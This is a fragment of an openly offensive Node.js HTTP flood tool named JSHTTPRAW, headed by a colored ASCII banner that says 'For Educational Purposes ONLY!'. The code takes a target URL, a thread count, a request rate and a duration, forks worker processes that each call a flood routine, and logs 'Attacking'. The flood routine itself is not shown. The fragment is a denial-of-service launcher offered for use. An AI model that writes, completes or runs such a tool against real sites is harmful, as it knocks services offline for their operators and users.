[38;2;57;215;246m [38;2;57;214;246m [38;2;57;213;246m [38;2;57;212;246m [38;2;57;211;246m [38;2;57;210;246m [38;2;57;209;246m [38;2;57;208;246m [38;2;57;207;246m [38;2;57;206;246m [38;2;57;205;246m [38;2;57;204;246m [38;2;57;203;246m [38;2;57;202;246m [38;2;57;201;246m [38;2;57;200;246m [38;2;57;199;246m [38;2;57;198;246m [38;2;57;197;246m [38;2;57;196;246m [38;2;57;195;246m [38;2;57;194;246m [38;2;57;193;246m [38;2;57;192;246m [38;2;57;191;246m [38;2;57;190;246m [38;2;57;189;246m [38;2;57;188;246m [38;2;57;187;246m [38;2;57;186;246m [38;2;57;185;246m [38;2;57;184;246m [38;2;57;183;246m [38;2;57;182;246m [38;2;57;181;246m [38;2;57;180;246m [38;2;57;179;246m [38;2;57;178;246m [38;2;57;177;246m [38;2;57;176;246m [38;2;57;175;246m [38;2;57;174;246m [38;2;57;173;246m [38;2;57;172;246m [38;2;57;171;246m [38;2;57;170;246m [38;2;57;169;246m [38;2;57;168;246m [38;2;57;167;246m [38;2;57;166;246m [38;2;57;165;246m [38;2;57;164;246m [38;2;57;163;246m [38;2;57;162;246mF[38;2;57;161;246mo[38;2;57;160;246mr[38;2;57;159;246m [38;2;57;158;246mE[38;2;57;157;246md[38;2;57;156;246mu[38;2;57;155;246mc[38;2;57;154;246ma[38;2;57;153;246mt[38;2;57;152;246mi[38;2;57;151;246mo[38;2;57;150;246mn[38;2;57;149;246ma[38;2;57;148;246ml[38;2;57;147;246m [38;2;57;146;246mP[38;2;57;145;246mu[38;2;57;144;246mr[38;2;57;143;246mp[38;2;57;142;246mo[38;2;57;141;246ms[38;2;57;140;246me[38;2;57;139;246ms[38;2;57;138;246m [38;2;57;137;246mO[38;2;57;136;246mN[38;2;57;135;246mL[38;2;57;134;246mY[38;2;57;133;246m![38;2;57;132;246m
[38;2;57;215;246m8[38;2;57;214;246m8[38;2;57;213;246m8[38;2;57;212;246m [38;2;57;211;246m [38;2;57;210;246m [38;2;57;209;246m [38;2;57;208;246m8[38;2;57;207;246m8[38;2;57;206;246m8[38;2;57;205;246m [38;2;57;204;246m8[38;2;57;203;246m8[38;2;57;202;246m8[38;2;57;201;246m8[38;2;57;200;246m8[38;2;57;199;246m8[38;2;57;198;246m8[38;2;57;197;246m8[38;2;57;196;246m8[38;2;57;195;246m8[38;2;57;194;246m8[38;2;57;193;246m [38;2;57;192;246m8[38;2;57;191;246m8[38;2;57;190;246m8[38;2;57;189;246m8[38;2;57;188;246m8[38;2;57;187;246m8[38;2;57;186;246m8[38;2;57;185;246m8[38;2;57;184;246m8[38;2;57;183;246m8[38;2;57;182;246m8[38;2;57;181;246m [38;2;57;180;246m8[38;2;57;179;246m8[38;2;57;178;246m8[38;2;57;177;246m8[38;2;57;176;246m8[38;2;57;175;246m8[38;2;57;174;246m8[38;2;57;173;246mb[38;2;57;172;246m.[38;2;57;171;246m [38;2;57;170;246m [38;2;57;169;246m8[38;2;57;168;246m8[38;2;57;167;246m8[38;2;57;166;246m8[38;2;57;165;246m8[38;2;57;164;246m8[38;2;57;163;246m8[38;2;57;162;246mb[38;2;57;161;246m.[38;2;57;160;246m [38;2;57;159;246m [38;2;57;158;246m [38;2;57;157;246m [38;2;57;156;246m [38;2;57;155;246m [38;2;57;154;246m [38;2;57;153;246m [38;2;57;152;246m [38;2;57;151;246md[38;2;57;150;246m8[38;2;57;149;246m8[38;2;57;148;246m8[38;2;57;147;246m8[38;2;57;146;246m [38;2;57;145;246m8[38;2;57;144;246m8[38;2;57;143;246m8[38;2;57;142;246m [38;2;57;141;246m [38;2;57;140;246m [38;2;57;139;246m [38;2;57;138;246m [38;2;57;137;246m [38;2;57;136;246m [38;2;57;135;246m8[38;2;57;134;246m8[38;2;57;133;246m8[38;2;57;132;246m [38;2;57;131;246m
[38;2;57;215;246m8[38;2;57;214;246m8[38;2;57;213;246m8[38;2;57;212;246m [38;2;57;211;246m [38;2;57;210;246m [38;2;57;209;246m [38;2;57;208;246m8[38;2;57;207;246m8[38;2;57;206;246m8[38;2;57;205;246m [38;2;57;204;246m [38;2;57;203;246m [38;2;57;202;246m [38;2;57;201;246m [38;2;57;200;246m8[38;2;57;199;246m8[38;2;57;198;246m8[38;2;57;197;246m [38;2;57;196;246m [38;2;57;195;246m [38;2;57;194;246m [38;2;57;193;246m [38;2;57;192;246m [38;2;57;191;246m [38;2;57;190;246m [38;2;57;189;246m [38;2;57;188;246m8[38;2;57;187;246m8[38;2;57;186;246m8[38;2;57;185;246m [38;2;57;184;246m [38;2;57;183;246m [38;2;57;182;246m [38;2;57;181;246m [38;2;57;180;246m8[38;2;57;179;246m8[38;2;57;178;246m8[38;2;57;177;246m [38;2;57;176;246m [38;2;57;175;246m [38;2;57;174;246mY[38;2;57;173;246m8[38;2;57;172;246m8[38;2;57;171;246mb[38;2;57;170;246m [38;2;57;169;246m8[38;2;57;168;246m8[38;2;57;167;246m8[38;2;57;166;246m [38;2;57;165;246m [38;2;57;164;246m [38;2;57;163;246mY[38;2;57;162;246m8[38;2;57;161;246m8[38;2;57;160;246mb[38;2;57;159;246m [38;2;57;158;246m [38;2;57;157;246m [38;2;57;156;246m [38;2;57;155;246m [38;2;57;154;246m [38;2;57;153;246m [38;2;57;152;246md[38;2;57;151;246m8[38;2;57;150;246m8[38;2;57;149;246m8[38;2;57;148;246m8[38;2;57;147;246m8[38;2;57;146;246m [38;2;57;145;246m8[38;2;57;144;246m8[38;2;57;143;246m8[38;2;57;142;246m [38;2;57;141;246m [38;2;57;140;246m [38;2;57;139;246mo[38;2;57;138;246m [38;2;57;137;246m [38;2;57;136;246m [38;2;57;135;246m8[38;2;57;134;246m8[38;2;57;133;246m8[38;2;57;132;246m [38;2;57;131;246m
[38;2;57;215;246m8[38;2;57;214;246m8[38;2;57;213;246m8[38;2;57;212;246m [38;2;57;211;246m [38;2;57;210;246m [38;2;57;209;246m [38;2;57;208;246m8[38;2;57;207;246m8[38;2;57;206;246m8[38;2;57;205;246m [38;2;57;204;246m [38;2;57;203;246m [38;2;57;202;246m [38;2;57;201;246m [38;2;57;200;246m8[38;2;57;199;246m8[38;2;57;198;246m8[38;2;57;197;246m [38;2;57;196;246m [38;2;57;195;246m [38;2;57;194;246m [38;2;57;193;246m [38;2;57;192;246m [38;2;57;191;246m [38;2;57;190;246m [38;2;57;189;246m [38;2;57;188;246m8[38;2;57;187;246m8[38;2;57;186;246m8[38;2;57;185;246m [38;2;57;184;246m [38;2;57;183;246m [38;2;57;182;246m [38;2;57;181;246m [38;2;57;180;246m8[38;2;57;179;246m8[38;2;57;178;246m8[38;2;57;177;246m [38;2;57;176;246m [38;2;57;175;246m [38;2;57;174;246m [38;2;57;173;246m8[38;2;57;172;246m8[38;2;57;171;246m8[38;2;57;170;246m [38;2;57;169;246m8[38;2;57;168;246m8[38;2;57;167;246m8[38;2;57;166;246m [38;2;57;165;246m [38;2;57;164;246m [38;2;57;163;246m [38;2;57;162;246m8[38;2;57;161;246m8[38;2;57;160;246m8[38;2;57;159;246m [38;2;57;158;246m [38;2;57;157;246m [38;2;57;156;246m [38;2;57;155;246m [38;2;57;154;246m [38;2;57;153;246md[38;2;57;152;246m8[38;2;57;151;246m8[38;2;57;150;246mP[38;2;57;149;246m8[38;2;57;148;246m8[38;2;57;147;246m8[38;2;57;146;246m [38;2;57;145;246m8[38;2;57;144;246m8[38;2;57;143;246m8[38;2;57;142;246m [38;2;57;141;246m [38;2;57;140;246md[38;2;57;139;246m8[38;2;57;138;246mb[38;2;57;137;246m [38;2;57;136;246m [38;2;57;135;246m8[38;2;57;134;246m8[38;2;57;133;246m8[38;2;57;132;246m [38;2;57;131;246m
[38;2;57;215;246m8[38;2;57;214;246m8[38;2;57;213;246m8[38;2;57;212;246m8[38;2;57;211;246m8[38;2;57;210;246m8[38;2;57;209;246m8[38;2;57;208;246m8[38;2;57;207;246m8[38;2;57;206;246m8[38;2;57;205;246m [38;2;57;204;246m [38;2;57;203;246m [38;2;57;202;246m [38;2;57;201;246m [38;2;57;200;246m8[38;2;57;199;246m8[38;2;57;198;246m8[38;2;57;197;246m [38;2;57;196;246m [38;2;57;195;246m [38;2;57;194;246m [38;2;57;193;246m [38;2;57;192;246m [38;2;57;191;246m [38;2;57;190;246m [38;2;57;189;246m [38;2;57;188;246m8[38;2;57;187;246m8[38;2;57;186;246m8[38;2;57;185;246m [38;2;57;184;246m [38;2;57;183;246m [38;2;57;182;246m [38;2;57;181;246m [38;2;57;180;246m8[38;2;57;179;246m8[38;2;57;178;246m8[38;2;57;177;246m [38;2;57;176;246m [38;2;57;175;246m [38;2;57;174;246md[38;2;57;173;246m8[38;2;57;172;246m8[38;2;57;171;246mP[38;2;57;170;246m [38;2;57;169;246m8[38;2;57;168;246m8[38;2;57;167;246m8[38;2;57;166;246m [38;2;57;165;246m [38;2;57;164;246m [38;2;57;163;246md[38;2;57;162;246m8[38;2;57;161;246m8[38;2;57;160;246mP[38;2;57;159;246m [38;2;57;158;246m [38;2;57;157;246m [38;2;57;156;246m [38;2;57;155;246m [38;2;57;154;246md[38;2;57;153;246m8[38;2;57;152;246m8[38;2;57;151;246mP[38;2;57;150;246m [38;2;57;149;246m8[38;2;57;148;246m8[38;2;57;147;246m8[38;2;57;146;246m [38;2;57;145;246m8[38;2;57;144;246m8[38;2;57;143;246m8[38;2;57;142;246m [38;2;57;141;246md[38;2;57;140;246m8[38;2;57;139;246m8[38;2;57;138;246m8[38;2;57;137;246mb[38;2;57;136;246m [38;2;57;135;246m8[38;2;57;134;246m8[38;2;57;133;246m8[38;2;57;132;246m [38;2;57;131;246m
[38;2;57;215;246m8[38;2;57;214;246m8[38;2;57;213;246m8[38;2;57;212;246m [38;2;57;211;246m [38;2;57;210;246m [38;2;57;209;246m [38;2;57;208;246m8[38;2;57;207;246m8[38;2;57;206;246m8[38;2;57;205;246m [38;2;57;204;246m [38;2;57;203;246m [38;2;57;202;246m [38;2;57;201;246m [38;2;57;200;246m8[38;2;57;199;246m8[38;2;57;198;246m8[38;2;57;197;246m [38;2;57;196;246m [38;2;57;195;246m [38;2;57;194;246m [38;2;57;193;246m [38;2;57;192;246m [38;2;57;191;246m [38;2;57;190;246m [38;2;57;189;246m [38;2;57;188;246m8[38;2;57;187;246m8[38;2;57;186;246m8[38;2;57;185;246m [38;2;57;184;246m [38;2;57;183;246m [38;2;57;182;246m [38;2;57;181;246m [38;2;57;180;246m8[38;2;57;179;246m8[38;2;57;178;246m8[38;2;57;177;246m8[38;2;57;176;246m8[38;2;57;175;246m8[38;2;57;174;246m8[38;2;57;173;246mP[38;2;57;172;246m"[38;2;57;171;246m [38;2;57;170;246m [38;2;57;169;246m8[38;2;57;168;246m8[38;2;57;167;246m8[38;2;57;166;246m8[38;2;57;165;246m8[38;2;57;164;246m8[38;2;57;163;246m8[38;2;57;162;246mP[38;2;57;161;246m"[38;2;57;160;246m [38;2;57;159;246m [38;2;57;158;246m [38;2;57;157;246m [38;2;57;156;246m [38;2;57;155;246md[38;2;57;154;246m8[38;2;57;153;246m8[38;2;57;152;246mP[38;2;57;151;246m [38;2;57;150;246m [38;2;57;149;246m8[38;2;57;148;246m8[38;2;57;147;246m8[38;2;57;146;246m [38;2;57;145;246m8[38;2;57;144;246m8[38;2;57;143;246m8[38;2;57;142;246md[38;2;57;141;246m8[38;2;57;140;246m8[38;2;57;139;246m8[38;2;57;138;246m8[38;2;57;137;246m8[38;2;57;136;246mb[38;2;57;135;246m8[38;2;57;134;246m8[38;2;57;133;246m8[38;2;57;132;246m [38;2;57;131;246m
[38;2;57;215;246m8[38;2;57;214;246m8[38;2;57;213;246m8[38;2;57;212;246m [38;2;57;211;246m [38;2;57;210;246m [38;2;57;209;246m [38;2;57;208;246m8[38;2;57;207;246m8[38;2;57;206;246m8[38;2;57;205;246m [38;2;57;204;246m [38;2;57;203;246m [38;2;57;202;246m [38;2;57;201;246m [38;2;57;200;246m8[38;2;57;199;246m8[38;2;57;198;246m8[38;2;57;197;246m [38;2;57;196;246m [38;2;57;195;246m [38;2;57;194;246m [38;2;57;193;246m [38;2;57;192;246m [38;2;57;191;246m [38;2;57;190;246m [38;2;57;189;246m [38;2;57;188;246m8[38;2;57;187;246m8[38;2;57;186;246m8[38;2;57;185;246m [38;2;57;184;246m [38;2;57;183;246m [38;2;57;182;246m [38;2;57;181;246m [38;2;57;180;246m8[38;2;57;179;246m8[38;2;57;178;246m8[38;2;57;177;246m [38;2;57;176;246m [38;2;57;175;246m [38;2;57;174;246m [38;2;57;173;246m [38;2;57;172;246m [38;2;57;171;246m [38;2;57;170;246m [38;2;57;169;246m8[38;2;57;168;246m8[38;2;57;167;246m8[38;2;57;166;246m [38;2;57;165;246mT[38;2;57;164;246m8[38;2;57;163;246m8[38;2;57;162;246mb[38;2;57;161;246m [38;2;57;160;246m [38;2;57;159;246m [38;2;57;158;246m [38;2;57;157;246m [38;2;57;156;246md[38;2;57;155;246m8[38;2;57;154;246m8[38;2;57;153;246mP[38;2;57;152;246m [38;2;57;151;246m [38;2;57;150;246m [38;2;57;149;246m8[38;2;57;148;246m8[38;2;57;147;246m8[38;2;57;146;246m [38;2;57;145;246m8[38;2;57;144;246m8[38;2;57;143;246m8[38;2;57;142;246m8[38;2;57;141;246m8[38;2;57;140;246mP[38;2;57;139;246m [38;2;57;138;246mY[38;2;57;137;246m8[38;2;57;136;246m8[38;2;57;135;246m8[38;2;57;134;246m8[38;2;57;133;246m8[38;2;57;132;246m [38;2;57;131;246m
[38;2;57;215;246m8[38;2;57;214;246m8[38;2;57;213;246m8[38;2;57;212;246m [38;2;57;211;246m [38;2;57;210;246m [38;2;57;209;246m [38;2;57;208;246m8[38;2;57;207;246m8[38;2;57;206;246m8[38;2;57;205;246m [38;2;57;204;246m [38;2;57;203;246m [38;2;57;202;246m [38;2;57;201;246m [38;2;57;200;246m8[38;2;57;199;246m8[38;2;57;198;246m8[38;2;57;197;246m [38;2;57;196;246m [38;2;57;195;246m [38;2;57;194;246m [38;2;57;193;246m [38;2;57;192;246m [38;2;57;191;246m [38;2;57;190;246m [38;2;57;189;246m [38;2;57;188;246m8[38;2;57;187;246m8[38;2;57;186;246m8[38;2;57;185;246m [38;2;57;184;246m [38;2;57;183;246m [38;2;57;182;246m [38;2;57;181;246m [38;2;57;180;246m8[38;2;57;179;246m8[38;2;57;178;246m8[38;2;57;177;246m [38;2;57;176;246m [38;2;57;175;246m [38;2;57;174;246m [38;2;57;173;246m [38;2;57;172;246m [38;2;57;171;246m [38;2;57;170;246m [38;2;57;169;246m8[38;2;57;168;246m8[38;2;57;167;246m8[38;2;57;166;246m [38;2;57;165;246m [38;2;57;164;246mT[38;2;57;163;246m8[38;2;57;162;246m8[38;2;57;161;246mb[38;2;57;160;246m [38;2;57;159;246m [38;2;57;158;246m [38;2;57;157;246md[38;2;57;156;246m8[38;2;57;155;246m8[38;2;57;154;246m8[38;2;57;153;246m8[38;2;57;152;246m8[38;2;57;151;246m8[38;2;57;150;246m8[38;2;57;149;246m8[38;2;57;148;246m8[38;2;57;147;246m8[38;2;57;146;246m [38;2;57;145;246m8[38;2;57;144;246m8[38;2;57;143;246m8[38;2;57;142;246m8[38;2;57;141;246mP[38;2;57;140;246m [38;2;57;139;246m [38;2;57;138;246m [38;2;57;137;246mY[38;2;57;136;246m8[38;2;57;135;246m8[38;2;57;134;246m8[38;2;57;133;246m8[38;2;57;132;246m [38;2;57;131;246m
[38;2;57;215;246m8[38;2;57;214;246m8[38;2;57;213;246m8[38;2;57;212;246m [38;2;57;211;246m [38;2;57;210;246m [38;2;57;209;246m [38;2;57;208;246m8[38;2;57;207;246m8[38;2;57;206;246m8[38;2;57;205;246m [38;2;57;204;246m [38;2;57;203;246m [38;2;57;202;246m [38;2;57;201;246m [38;2;57;200;246m8[38;2;57;199;246m8[38;2;57;198;246m8[38;2;57;197;246m [38;2;57;196;246m [38;2;57;195;246m [38;2;57;194;246m [38;2;57;193;246m [38;2;57;192;246m [38;2;57;191;246m [38;2;57;190;246m [38;2;57;189;246m [38;2;57;188;246m8[38;2;57;187;246m8[38;2;57;186;246m8[38;2;57;185;246m [38;2;57;184;246m [38;2;57;183;246m [38;2;57;182;246m [38;2;57;181;246m [38;2;57;180;246m8[38;2;57;179;246m8[38;2;57;178;246m8[38;2;57;177;246m [38;2;57;176;246m [38;2;57;175;246m [38;2;57;174;246m [38;2;57;173;246m [38;2;57;172;246m [38;2;57;171;246m [38;2;57;170;246m [38;2;57;169;246m8[38;2;57;168;246m8[38;2;57;167;246m8[38;2;57;166;246m [38;2;57;165;246m [38;2;57;164;246m [38;2;57;163;246mT[38;2;57;162;246m8[38;2;57;161;246m8[38;2;57;160;246mb[38;2;57;159;246m [38;2;57;158;246md[38;2;57;157;246m8[38;2;57;156;246m8[38;2;57;155;246mP[38;2;57;154;246m [38;2;57;153;246m [38;2;57;152;246m [38;2;57;151;246m [38;2;57;150;246m [38;2;57;149;246m8[38;2;57;148;246m8[38;2;57;147;246m8[38;2;57;146;246m [38;2;57;145;246m8[38;2;57;144;246m8[38;2;57;143;246m8[38;2;57;142;246mP[38;2;57;141;246m [38;2;57;140;246m [38;2;57;139;246m [38;2;57;138;246m [38;2;57;137;246m [38;2;57;136;246mY[38;2;57;135;246m8[38;2;57;134;246m8[38;2;57;133;246m8[38;2;57;132;246m [38;2;57;131;246m
[38;2;57;215;246m [38;2;57;214;246m [38;2;57;213;246m [38;2;57;212;246m [38;2;57;211;246m [38;2;57;210;246m [38;2;57;209;246m [38;2;57;208;246m [38;2;57;207;246m [38;2;57;206;246m [38;2;57;205;246m [38;2;57;204;246m [38;2;57;203;246m [38;2;57;202;246m [38;2;57;201;246m [38;2;57;200;246m [38;2;57;199;246m [38;2;57;198;246m [38;2;57;197;246m [38;2;57;196;246m [38;2;57;195;246m [38;2;57;194;246m [38;2;57;193;246m [38;2;57;192;246m [38;2;57;191;246m [38;2;57;190;246m [38;2;57;189;246m [38;2;57;188;246m [38;2;57;187;246m [38;2;57;186;246m [38;2;57;185;246m [38;2;57;184;246m [38;2;57;183;246m [38;2;57;182;246m [38;2;57;181;246m [38;2;57;180;246m [38;2;57;179;246m [38;2;57;178;246m [38;2;57;177;246m [38;2;57;176;246m [38;2;57;175;246m [38;2;57;174;246m [38;2;57;173;246m [38;2;57;172;246m [38;2;57;171;246m [38;2;57;170;246m [38;2;57;169;246m [38;2;57;168;246m [38;2;57;167;246m [38;2;57;166;246m [38;2;57;165;246m [38;2;57;164;246m [38;2;57;163;246m [38;2;57;162;246m [38;2;57;161;246m [38;2;57;160;246m [38;2;57;159;246m [38;2;57;158;246m [38;2;57;157;246m [38;2;57;156;246m [38;2;57;155;246m [38;2;57;154;246m [38;2;57;153;246m [38;2;57;152;246m [38;2;57;151;246m [38;2;57;150;246m [38;2;57;149;246m [38;2;57;148;246m [38;2;57;147;246m [38;2;57;146;246m [38;2;57;145;246m [38;2;57;144;246m [38;2;57;143;246m [38;2;57;142;246m [38;2;57;141;246m [38;2;57;140;246m [38;2;57;139;246m [38;2;57;138;246m [38;2;57;137;246m [38;2;57;136;246m [38;2;57;135;246m [38;2;57;134;246m [38;2;57;133;246m [38;2;57;132;246m [38;2;57;131;246m
[38;2;57;215;246mJ[38;2;58;213;246mS[38;2;59;211;246mH[38;2;60;209;246mT[38;2;61;207;246mT[38;2;62;205;246mT[38;2;63;203;246mP[38;2;64;201;246mR[38;2;65;199;246mA[38;2;66;197;246mW[38;2;67;195;246m [38;2;68;193;246m|[38;2;69;191;246m [38;2;70;189;246mM[38;2;71;187;246ma[38;2;72;185;246md[38;2;73;183;246me[38;2;74;181;246m [38;2;75;179;246mW[38;2;76;177;246mi[38;2;77;175;246mt[38;2;78;173;246mh[38;2;79;171;246m [38;2;80;169;246m<[38;2;81;167;246m3[38;2;82;165;246m [38;2;83;163;246mB[38;2;84;161;246my[38;2;85;159;246m [38;2;86;157;246mC[38;2;87;155;246mh[38;2;88;153;246m4[38;2;89;151;246mk[38;2;90;149;246m1[38;2;91;147;246mt[38;2;92;145;246mz[38;2;93;143;246m [38;2;94;141;246m([38;2;95;139;246mW[38;2;96;137;246me[38;2;97;135;246mA[38;2;98;133;246mr[38;2;99;131;246me[38;2;100;129;246mR[38;2;101;127;246ma[38;2;102;125;246mi[38;2;103;123;246mn[38;2;104;121;246mB[38;2;105;119;246mo[38;2;106;117;246mw[38;2;107;115;246mH[38;2;108;113;246mA[38;2;109;111;246mT[38;2;110;109;246m)[0;00m
    `)
    console.log(`Usage: Node ${path.basename(__filename)} <url> <threads> <req_per_sec> <duration>`)
    process.exit(0);
} else {
    if (cluster.isMaster){
        console.log("Attacking");
        for (let i = 0; i < process.argv[3]; i++){
            cluster.fork();
        }
        console.log("Done (!)")
        setTimeout(() => {
            console.log("Attack Done (!)");
            process.exit(0);
        },process.argv[5] * 1000);
    } else {
        runflood();
    }
}

const parsed = url.parse(process.argv[2]);
